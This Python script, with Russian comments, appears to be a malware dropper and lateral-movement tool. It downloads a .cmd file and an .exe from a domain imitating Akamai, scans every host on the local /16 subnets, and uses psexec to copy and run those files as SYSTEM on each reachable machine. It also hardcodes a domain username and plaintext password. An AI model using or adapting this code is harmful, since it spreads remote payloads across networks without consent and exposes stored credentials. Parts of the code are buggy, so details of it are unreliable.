from concurrent.futures import ThreadPoolExecutor
import subprocess
import sys
import time
import ifaddr
from encodings import utf_8
import os
import platform
import threading
import socket
from datetime import datetime
import urllib.request

url1 = "https://akamainet.com/update/MonitoringCacheLog.cmd"
url2 = "https://akamainet.com/update/MonitoringCache.exe"
url3 = "https://akamainet.com/update/Service.SchCache.rtf"
url = []
url.append(url1)
url.append(url2)
path = os.path.abspath(os.path.dirname(sys.argv[0]))
files = []
exe = ""
for ur in url:
    try:

        urllib.request.urlretrieve(ur, ur.split('/')[-1])
        if ur.split('/')[-1].count('.exe') > 0:
            exe = ur.split('/')[-1]
            continue
        file = path + "\\"+ur.split('/')[-1]
        files.append(file)
        print(files)
    except urllib.error.HTTPError:
        continue
file = path + "\\"+exe
files.append(file)

result = []
iresult = 0
net_copy = []
inet_copy = 0
address = []


def getMyIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Создаем сокет (UDP)
    # Настраиваем сокет на BROADCAST вещание.
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.connect(('<broadcast>', 0))
    return s.getsockname()[0]


def netView(ip):
    cmd = "C:/Windows/System32/net.exe use \\\\"+ip
    result = subprocess.check_output(
        cmd, shell=True, text=True)
    result = result.encode('cp1251').decode('cp866')  # split('\n')
    print(result)
    return True


# NET USE \\10.100.24.28 Df4kq-poECW1 / user: eapteka\d.artamonov2 & & xcopy C: \Users\dartamonov\Documents\Git\Python\Python\junior\subjects.txt \\10.100.24.28\5.5 / i / e / h / y & & NET USE \\10.100.24.28 / DELETE
def netUse(ip):
    global net_copy
    global inet_copy
    begin = "NET USE \\\\"+ip  # +" "+password+" /user: "+username
    net_view = netView(ip)
    if (net_view):
        xcopy = "xcopy "+file+" \\\\"+ip+"\\"+netView(ip)+" /i /e /h /y"
        end = "NET USE \\\\"+ip+" /DELETE"
        cmd = begin, "&&", xcopy, "&&", end
        print(cmd)
        net_copy[inet_copy] = subprocess.check_output(
            cmd, shell=True, text=True)
        inet_copy += 1
        print(net_copy[inet_copy])
        # os.system(cmd, shell=True, text=True)


def psexecFunc(psexec):
    try:
        run = subprocess.Popen(psexec, stdout=sys.stdout)
        run.communicate()
        print(run)
    except subprocess.CalledProcessError:
        return


def threaded_function(address):
    for ip in address:

        for file in files:

            psexec = "psexec "+" -d " + " -c " + " \\\\"+ip + \
                "\\C:\programdata -h " + " -s " + " -f " + " -i " + file
            print(psexec)
            psexecFunc(psexec)




def sending(ip):
    run = subprocess.Popen(["copy "], stdout=sys.stdout)
    run = subprocess.Popen(["psexec", "-d", "-c", "\\\\"+ip, "-u", "eapteka\\d.artamonov2",  "-p", "Df4kq-poECW1",
                            "-h", "-s", "-f", "C:\\Users\\dartamonov\\Documents\\Git\\Python\\Python\\junior\\subjects.txt"], stdout=sys.stdout)
    run.communicate()


def scan_Ip(ip1, ip2, net):
    global address
    addr = net + str(ip1) + '.' + str(ip2)
    if netView(addr):
        address.append(addr)


def threadsLoop(net, adapters):
    with ThreadPoolExecutor(max_workers=50) as executor:
        for ip1 in range(start_point, end_point):
            # if ip1 > 1:
            #     break
            # ip1 = 1
            for ip2 in range(start_point, end_point):
                if net+str(ip1)+a+str(ip2) in adapters:
                    continue

                executor.submit(scan_Ip, ip1, ip2, net)

        # executor.join()
        # potoc.join()


def adapter():
    adapters = ifaddr.get_adapters()
    adap = []
    for adapter in adapters:

        # print("IPs of network adapter " + adapter.nice_name)
        for ip in adapter.ips:
            # print("   %s/%s" % (ip.ip, ip.network_prefix))
            if isinstance(ip.ip, str) and ip.ip != '127.0.0.1':
                print(ip.ip)
                adap.append(ip.ip)
    return adap


a = '.'
start_point = 1  # int(input("Enter the Starting Number: "))
end_point = 256  # int(input("Enter the Last Number: "))
print(os.popen('dir').read())
oc = platform.system()
if (oc == "Windows"):
    ping_com = "ping -n 1 "
else:
    ping_com = "ping -c 1 "

t1 = datetime.now()
print("Scanning in Progress:")
adapters = adapter()

adapt = []
for ad in adapters:
    ad = ad.split('.')
    ad = ad[0] + a + ad[1] + a
    if ad not in adapt:
        adapt.append(ad)
i = 0

for net_split in adapt:
    # net_split = adapt[2]
    net_split = net_split.split('.')
    # print('You IP :', net_split)
    net = net_split[0] + a + net_split[1] + a
    iTread = threading.Thread(target=threadsLoop, args=(net, adapters))
    iTread.start()


iTread.join()
print(address)
threaded_function(address)

t2 = datetime.now()
total = t2 - t1

print("Scanning completed in: ", total)
